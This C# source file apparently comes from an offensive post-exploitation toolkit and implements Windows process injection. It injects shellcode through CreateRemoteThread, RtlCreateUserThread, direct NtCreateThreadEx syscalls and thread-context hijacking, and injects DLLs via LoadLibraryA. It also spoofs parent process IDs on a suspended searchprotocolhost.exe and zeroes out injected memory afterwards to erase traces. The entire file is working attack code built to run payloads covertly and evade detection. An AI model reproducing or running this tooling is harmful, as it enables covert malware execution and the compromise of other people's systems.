using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading;
using Core.WindowsInternals;
using static Core.WindowsInternals.Internals;

namespace Core.Injection
{
    internal static class Injection
    {
        internal delegate void InjectionMethod(int pid32, byte[] payload, bool rwx = false);

        internal static void InjectSC(InjectionMethod injectionFunc, string[] args)
        {
            try
            {
                int pid;
                var ppid = 0;
                string path;
                var rwx = false;

                if (args.Contains("rwx"))
                {
                    rwx = true;
                    args = args.Where(arg => arg != "rwx").ToArray();
                }

                if (args.Length < 3)
                {
                    path = @"c:\windows\system32\searchprotocolhost.exe";
                    Console.WriteLine(" > [-] Missing Path or PID parameter starting process: " + path);
                    pid = (int)SharpCreateProcess(ppid, path, true);
                }
                else
                {
                    path = args[2].Replace("\"", "");
                    Console.WriteLine(" > [+] Injecting into: " + path);
                    if (!int.TryParse(args[2], out pid))
                    {
                        if (args.Length > 3)
                        {
                            int.TryParse(args[3], out ppid);
                        }

                        Console.WriteLine(" > [+] Spoofing ppid: " + ppid);
                        pid = (int)SharpCreateProcess(ppid, path, true);
                    }
                }

                var sc = Convert.FromBase64String(args[1]);
                injectionFunc(pid, sc, rwx);
            }
            catch (Exception e)
            {
                Console.WriteLine("[-] Error: " + e);
            }
        }

        internal static void InjectDLL(string[] args)
        {
            try
            {
                int pid;
                var ppid = 0;
                string path;

                if (args.Length < 3)
                {
                    path = @"c:\windows\system32\searchprotocolhost.exe";
                    Console.WriteLine("[-] Missing Path or PID parameter using " + path);
                    pid = (int)SharpCreateProcess(ppid, path, true);
                }
                else
                {
                    path = args[2].Replace("\"", "");
                    Console.WriteLine(" > [+] Injecting into: " + path);
                    if (!int.TryParse(args[2], out pid))
                    {
                        if (args.Length > 3)
                        {
                            int.TryParse(args[3], out ppid);
                        }

                        Console.WriteLine(" > [+] Spoofing ppid: " + ppid);
                        pid = (int)SharpCreateProcess(ppid, path, true);
                    }
                }

                var payload = args[1].Replace("\"", "");

                Console.WriteLine($" > [+] Injecting DLL ({payload}) into PID: " + pid);

                var hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, (uint)pid);
                Console.WriteLine(" > [+] OpenProcess hProcess: " + hProcess);

                var allocMemAddress = VirtualAllocEx(hProcess, IntPtr.Zero, (payload.Length + 1) * Marshal.SizeOf(typeof(char)),
                    MEM_COMMIT | MEM_RESERVE,
                    PAGE_READWRITE);

                var targetDLL = LoadLibrary("kernel32.dll");
                if (targetDLL == IntPtr.Zero)
                {
                    Console.WriteLine(" > [-] Error cannot find kernel32.dll");
                }

                var procAddress = GetProcAddress(targetDLL, "LoadLibraryA");

                Console.WriteLine(" > [+] VirtualAllocEx : {0:X}", allocMemAddress.ToInt64());

                WriteProcessMemory(hProcess, allocMemAddress, Encoding.Default.GetBytes(payload), (payload.Length + 1) * Marshal.SizeOf(typeof(char)), out _);

                Console.WriteLine(" > [+] CreateRemoteThread: " + procAddress);
                var hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, procAddress, allocMemAddress, 0, IntPtr.Zero);

                if (hThread == IntPtr.Zero)
                {
                    Console.WriteLine(" > [-] Error: CreateRemoteThread failed > LastError: " + Marshal.GetLastWin32Error());
                }

                if (Marshal.GetLastWin32Error() != 0)
                {
                    Console.WriteLine(" > LastError: " + Marshal.GetLastWin32Error());
                }
            }
            catch (Exception e)
            {
                Console.WriteLine("[-] Error: " + e);
            }
        }

        internal static void RtlCreateUserThreadInjection(int pid32, byte[] payload32, bool rwx = false)
        {
            Console.WriteLine(" > [+] Injecting into PID: " + pid32);
            var hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, (uint)pid32);

            Console.WriteLine(" > [+] OpenProcess hProcess:  0x" + $"{hProcess.ToInt64():X8}");
            var size = payload32.Length * 2;

            var protect = rwx ? PAGE_EXECUTE_READWRITE : PAGE_READWRITE;

            var hBaseAddress = VirtualAllocEx(hProcess, IntPtr.Zero, size, 0x3000, protect);
            if (hBaseAddress == IntPtr.Zero)
            {
                Console.WriteLine($" > [-] VirtualAllocEx {(rwx ? "RWX" : "RW")}: Failed");
                return;
            }

            Console.WriteLine($" > [+] VirtualAllocEx {(rwx ? "RWX" : "RW")}: 0x" + $"{hBaseAddress.ToInt64():X8}");
            if (WriteProcessMemory(hProcess, hBaseAddress, payload32, payload32.Length, out _))
            {
                Console.WriteLine(" > [+] WriteProcessMemory succeeded");
                var tHandle = IntPtr.Zero;

                if (protect != PAGE_EXECUTE_READWRITE)
                {
                    if (!VirtualProtectEx(hProcess, hBaseAddress, size, PAGE_EXECUTE_READ, out _))
                    {
                        Console.WriteLine(" > [-] VirtualProtectEx RX: Failed");
                        return;
                    }
                }

                var hintThread = RtlCreateUserThread(hProcess, IntPtr.Zero, false, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, hBaseAddress, IntPtr.Zero, ref tHandle,
                    IntPtr.Zero);

                if (hintThread != 0)
                {
                    var hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, hBaseAddress, IntPtr.Zero, 0, IntPtr.Zero);
                    Console.WriteLine(" > [-] RtlCreateUserThread Failed - Failing over to CreateRemoteThread: " + hThread);
                    if (hThread == IntPtr.Zero)
                    {
                        Console.WriteLine(" > [-] CreateRemoteThread Failed - Failing over to CreateRemoteThread64: " + hThread);
                        Util.CreateRemoteThread64((uint)hProcess.ToInt32(), (uint)hBaseAddress.ToInt32(), 0);
                    }

                    var threadHandleClosed = CloseHandle(hThread);
                    Console.WriteLine(" > [+] CloseHandle to Inject Thread: " + threadHandleClosed);
                }
                else
                {
                    Console.WriteLine(" > [+] RtlCreateUserThread Injection: " + tHandle);
                    var closedHandle = CloseHandle(tHandle);
                    Console.WriteLine(" > [+] CloseHandle to Inject Thread: " + closedHandle);
                }
            }
            else
            {
                Console.WriteLine(" > [-] Failed to WriteProcessMemory");
            }

            // wait for execution to start in the remote process then clear the shellcode stub in the remote process
            Thread.Sleep(10000);
            var overwriteData = new byte[payload32.Length];
            for (var i = 0; i < overwriteData.Length; i++)
            {
                overwriteData[i] = 0x00;
            }

            if (!VirtualProtectEx(hProcess, hBaseAddress, size, PAGE_READWRITE, out _))
            {
                Console.WriteLine(" > [-] VirtualProtectEx RW: Failed");
                return;
            }

            if (WriteProcessMemory(hProcess, hBaseAddress, overwriteData, overwriteData.Length, out _))
            {
                Console.WriteLine(" > [-] Overwritten Memory Allocation with 0x00's: True");
            }

            if (!VirtualFreeEx(hProcess, hBaseAddress, 0, FreeType.Release))
            {
                Console.WriteLine(" > [-] VirtualFreeEx after 10 seconds: Failed");
            }
            else
            {
                Console.WriteLine(" > [+] VirtualFreeEx after 10 seconds: True");
            }

            var closed = CloseHandle(hProcess);
            Console.WriteLine(" > [+] Close handle Process: " + closed);

            if (Marshal.GetLastWin32Error() != 0)
            {
                Console.WriteLine(" > LastError: " + Marshal.GetLastWin32Error());
            }
        }

        internal static void SyscallInjection(int pid32, byte[] payload32, bool rwx = false)
        {
            //https://github.com/mobdk/NewShellCS
            var clientID = new ClientId { uniqueProcess = new IntPtr(pid32), uniqueThread = IntPtr.Zero };
            var procHandle = IntPtr.Zero;
            var result = SysCall.ZwOpenProcess(ref procHandle, ProcessAccessFlags.All, new ObjectAttributes(), ref clientID);
            Console.WriteLine($" > [+] NtOpenProcess DIRECT SYSCALL: {result}");

            if (procHandle == IntPtr.Zero)
            {
                if (result == Ntstatus.InvalidCid)
                {
                    Console.WriteLine(" > [+] NtOpenProcess DIRECT SYSCALL: Retrying with Win32 OpenProcess");
                    procHandle = OpenProcess(PROCESS_ALL_ACCESS, false, (uint)pid32);

                    if (procHandle == IntPtr.Zero)
                    {
                        Console.WriteLine($" > [+] NtOpenProcess DIRECT SYSCALL: FAILED - GetLastError: 0x{GetLastError():X}");
                        return;
                    }
                }
                else
                {
                    Console.WriteLine($" > [+] NtOpenProcess DIRECT SYSCALL: {result}");
                    return;
                }
            }

            var allocMemAddress = IntPtr.Zero;
            var scSize = (UIntPtr)(uint)payload32.Length;

            var protect = rwx ? PAGE_EXECUTE_READWRITE : PAGE_READWRITE;

            result = SysCall.ZwAllocateVirtualMemory(procHandle, ref allocMemAddress, IntPtr.Zero, ref scSize, MEM_COMMIT | MEM_RESERVE,
                protect);
            Console.WriteLine($" > [+] NtAllocateVirtualMemory DIRECT SYSCALL {(rwx ? "RWX" : "RW")}: {result} at 0x{allocMemAddress.ToInt64():X}");
            if (allocMemAddress == IntPtr.Zero)
            {
                return;
            }

            var unmanagedPointer = Marshal.AllocHGlobal(payload32.Length);
            Marshal.Copy(payload32, 0, unmanagedPointer, payload32.Length);
            var byteWritten = IntPtr.Zero;
            result = SysCall.ZwWriteVirtualMemory(procHandle, ref allocMemAddress, unmanagedPointer, (uint)payload32.Length, ref byteWritten);
            Console.WriteLine($" > [+] NtWriteVirtualMemory DIRECT SYSCALL: {result}");
            if (byteWritten == IntPtr.Zero)
            {
                return;
            }

            if (protect != PAGE_EXECUTE_READWRITE)
            {
                var scSize2 = (IntPtr)(uint)payload32.Length;
                result = SysCall.ZwProtectVirtualMemory(procHandle, ref allocMemAddress, ref scSize2, PAGE_EXECUTE_READ, out _);
                Console.WriteLine($" > [+] NtProtectVirtualMemory DIRECT SYSCALL RX: {result}");
            }

            Marshal.FreeHGlobal(unmanagedPointer);
            result = SysCall.ZwCreateThreadEx(out var hRemoteThread, GENERIC_ALL, IntPtr.Zero, procHandle, allocMemAddress, IntPtr.Zero, 0, 0, 0, 0, IntPtr.Zero);
            Console.WriteLine($" > [+] NtCreateThreadEx DIRECT SYSCALL: {result}");

            CloseHandle(hRemoteThread);
            Console.WriteLine(" > [+] Close handle hRemoteThread: " + hRemoteThread);
            CloseHandle(procHandle);
            Console.WriteLine(" > [+] Close handle procHandle: " + procHandle);
        }

        internal static void CTXInjection(int pid32, byte[] payload, bool rwx = false)
        {
            //https://github.com/pwndizzle/c-sharp-memory-injection/blob/master/thread-hijack.cs  
            Console.WriteLine(" > [+] Injecting into PID: " + pid32);
            var hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, (uint)pid32);
            Console.WriteLine(" > [+] OpenProcess hProcess:  0x" + $"{hProcess.ToInt64():X}");

            // Open and Suspend first thread
            var targetProcess = Process.GetProcessById(pid32);
            var pT = targetProcess.Threads[0];
            Console.WriteLine(" > [+] ThreadId: " + targetProcess.Threads[0].Id);
            var pOpenThread = OpenThread(ThreadAccess.ThreadHijack, false, (uint)pT.Id);
            SuspendThread(pOpenThread);

            // OpenProcess to allocate memory
            OpenProcess(
                PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
                false, targetProcess.Id);

            var protect = rwx ? PAGE_EXECUTE_READWRITE : PAGE_READWRITE;

            // Allocate memory for shellcode within process
            var allocMemAddress = VirtualAllocEx(hProcess, IntPtr.Zero, payload.Length * 2, MEM_COMMIT | MEM_RESERVE, protect);
            if (allocMemAddress == IntPtr.Zero)
            {
                Console.WriteLine($" > [-] VirtualAllocEx {(rwx ? "RWX" : "RW")}: Failed");
                return;
            }

            Console.WriteLine($" > [+] VirtualAllocEx {(rwx ? "RWX" : "RW")}: 0x" + $"{allocMemAddress.ToInt64():X8}");

            var targetDLL = LoadLibrary("kernel32.dll");
            if (targetDLL == IntPtr.Zero)
            {
                Console.WriteLine("[-] Error cannot find kernel32.dll");
            }

            var procAddress = GetProcAddress(targetDLL, "LoadLibraryA");

            // Write shellcode within process
            if (!WriteProcessMemory(hProcess, allocMemAddress, payload, payload.Length, out _))
            {
                Console.WriteLine(" > [-] WriteProcessMemory: Failed");
                return;
            }

            if (protect != PAGE_EXECUTE_READWRITE)
            {
                if (!VirtualProtectEx(hProcess, allocMemAddress, payload.Length, PAGE_EXECUTE_READ, out _))
                {
                    Console.WriteLine(" > [-] VirtualProtectEx RX: Failed");
                    return;
                }
            }

            Console.WriteLine(" > [+] CreateRemoteThread: " + procAddress);
            var hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, procAddress, IntPtr.Zero, 0x00000004, IntPtr.Zero);

            if (hThread == IntPtr.Zero)
            {
                Console.WriteLine("[x] Error: CreateRemoteThread failed > LastError: " + Marshal.GetLastWin32Error());
                return;
            }

            // Get thread context
            var tContext = new Context64 { ContextFlags = ContextFlags.ContextFull };
            if (GetThreadContext(hThread, ref tContext))
            {
                Console.WriteLine(" > [+] CurrentEip: {0}", tContext.Rip);
            }

            // Set context EIP to location of shellcode
            tContext.Rip = (ulong)allocMemAddress.ToInt64();

            // Apply new context to suspended thread
            if (!SetThreadContext(hThread, ref tContext))
            {
                Console.WriteLine("[-] Error setting context");
            }

            if (GetThreadContext(hThread, ref tContext))
            {
                Console.WriteLine(" > [+] ShellcodeAddress: " + allocMemAddress);
                Console.WriteLine(" > [+] NewEip: {0}", tContext.Rip);
            }

            // Resume the thread, redirecting execution to shellcode, then back to original process
            Console.WriteLine(" > [+] Redirecting execution!");
            Console.WriteLine(" > [+] Resuming thread");
            ResumeThread(hThread);

            // wait for execution to start in the remote process then clear the shellcode stub in the remote process
            Thread.Sleep(10000);
            var overwriteData = new byte[payload.Length];
            for (var i = 0; i < overwriteData.Length; i++)
            {
                overwriteData[i] = 0x00;
            }

            if (!VirtualProtectEx(hProcess, allocMemAddress, payload.Length, PAGE_READWRITE, out _))
            {
                Console.WriteLine(" > [-] VirtualProtectEx RW: Failed");
                return;
            }

            if (WriteProcessMemory(hProcess, allocMemAddress, overwriteData, overwriteData.Length, out _))
            {
                Console.WriteLine(" > [-] Overwritten Memory Allocation with 0x00's: True");
            }

            if (!VirtualFreeEx(hProcess, allocMemAddress, 0, FreeType.Release))
            {
                Console.WriteLine(" > [-] VirtualFreeEx after 10 seconds: Failed");
            }
            else
            {
                Console.WriteLine(" > [+] VirtualFreeEx after 10 seconds: True");
            }

            var handleClosed = CloseHandle(hProcess);
            Console.WriteLine(" > [+] Closed Process Handle: " + handleClosed);

            if (Marshal.GetLastWin32Error() != 0)
            {
                Console.WriteLine(" > LastError: " + Marshal.GetLastWin32Error());
            }
        }

        private static uint SharpCreateProcess(int parentProcessId, string commandLine, bool createSuspended)
        {
            var pInfo = new ProcessInformation();
            var sInfoEx = new Startupinfoex();
            sInfoEx.StartupInfo.cb = (uint)Marshal.SizeOf(sInfoEx);
            var lpValue = IntPtr.Zero;

            try
            {
                if (parentProcessId > 0)
                {
                    var lpSize = IntPtr.Zero;
                    InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref lpSize);

                    sInfoEx.lpAttributeList = Marshal.AllocHGlobal(lpSize);
                    InitializeProcThreadAttributeList(sInfoEx.lpAttributeList, 1, 0, ref lpSize);

                    var parentHandle = Process.GetProcessById(parentProcessId).Handle;
                    // This value should persist until the attribute list is destroyed using the DeleteProcThreadAttributeList function
                    lpValue = Marshal.AllocHGlobal(IntPtr.Size);
                    Marshal.WriteIntPtr(lpValue, parentHandle);

                    UpdateProcThreadAttribute(sInfoEx.lpAttributeList, 0, (IntPtr)PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, lpValue, (IntPtr)IntPtr.Size,
                        IntPtr.Zero, IntPtr.Zero);
                }

                var pSec = new SecurityAttributes();
                var tSec = new SecurityAttributes();
                pSec.nLength = Marshal.SizeOf(pSec);
                tSec.nLength = Marshal.SizeOf(tSec);

                uint processCreationFlags = 0;

                var ppidSpoof = parentProcessId > 0;

                if (createSuspended)
                {
                    processCreationFlags |= CREATE_SUSPENDED;
                }

                if (ppidSpoof)
                {
                    processCreationFlags |= EXTENDED_STARTUPINFO_PRESENT;
                }

                CreateProcess(null, commandLine, ref pSec, ref tSec, false, processCreationFlags,
                    IntPtr.Zero, null, ref sInfoEx, out pInfo);

                return pInfo.dwProcessId;
            }
            finally
            {
                // Free the attribute list
                if (sInfoEx.lpAttributeList != IntPtr.Zero)
                {
                    DeleteProcThreadAttributeList(sInfoEx.lpAttributeList);
                    Marshal.FreeHGlobal(sInfoEx.lpAttributeList);
                }

                Marshal.FreeHGlobal(lpValue);

                // Close process and thread handles
                if (pInfo.hThread != IntPtr.Zero)
                {
                    Console.WriteLine(" > [+] CloseHandle hThread: 0x" + $"{pInfo.hThread.ToInt64():X}");
                    CloseHandle(pInfo.hThread);
                }

                if (pInfo.hProcess != IntPtr.Zero)
                {
                    Console.WriteLine(" > [+] CloseHandle hProcess: 0x" + $"{pInfo.hProcess.ToInt64():X}");
                    CloseHandle(pInfo.hProcess);
                }
            }
        }
    }
}